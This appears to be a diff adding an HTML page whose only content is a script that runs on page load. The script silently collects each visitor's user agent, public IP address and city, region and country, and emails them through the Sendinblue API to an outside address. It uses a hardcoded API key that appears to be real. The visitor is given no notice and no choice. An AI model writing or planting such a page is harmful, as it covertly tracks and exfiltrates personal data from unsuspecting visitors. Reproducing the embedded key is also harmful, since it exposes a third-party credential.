@@ -1,0 +1,58 @@
+<html>
+<script>
+const igotSendInBlueApikey = "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";
+
+function getBrowserDetails() {
+  console.log("User Agent:", navigator.userAgent);
+  fetch('https://api.ipify.org/?format=json')
+    .then(response => response.json())
+    .then(data => {
+      console.log("Public IP Address:", data.ip);
+      return fetch(`https://ipapi.co/${data.ip}/json/`);
+    })
+    .then(response => response.json())
+    .then(data => {
+      console.log("Location:", `${data.city}, ${data.region}, ${data.country_name}`);
+      const consoleData = `<table style="border:1px solid black; border-collapse:collapse;"> 
+                            <tr>
+                              <td style="border:1px solid black; padding: 5px;">User Agent:</td>
+                              <td style="border:1px solid black; padding: 5px;">${navigator.userAgent}</td>
+                            </tr>
+                            <tr>
+                              <td style="border:1px solid black; padding: 5px;">Public IP Address:</td>
+                              <td style="border:1px solid black; padding: 5px;">${data.ip}</td>
+                            </tr>
+                            <tr>
+                              <td style="border:1px solid black; padding: 5px;">Location:</td>
+                              <td style="border:1px solid black; padding: 5px;">${data.city}, ${data.region}, ${data.country_name}</td>
+                            </tr>
+                          </table>`;
+      const sendinblueApiKey = igotSendInBlueApikey; // Replace with your actual API key
+      fetch('https://api.sendinblue.com/v3/smtp/email', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'api-key': sendinblueApiKey
+        },
+        body: JSON.stringify({
+          'to': [{'email': 'cisalov109@jthoven.com'}],
+          'subject': 'Browser Details',
+          'htmlContent': consoleData,
+          'sender': {'email': 'igotapps650@gmail.com'}
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          console.log("Email sent successfully.");
+        } else {
+          console.error("Failed to send email:", response.status, response.statusText);
+        }
+      })
+      .catch(error => console.error("Failed to send email:", error));
+    })
+    .catch(error => console.error("Failed to fetch IP address and location:", error));
+  console.log("Other available information:", navigator);
+}
+getBrowserDetails();
+</script>
+</html>
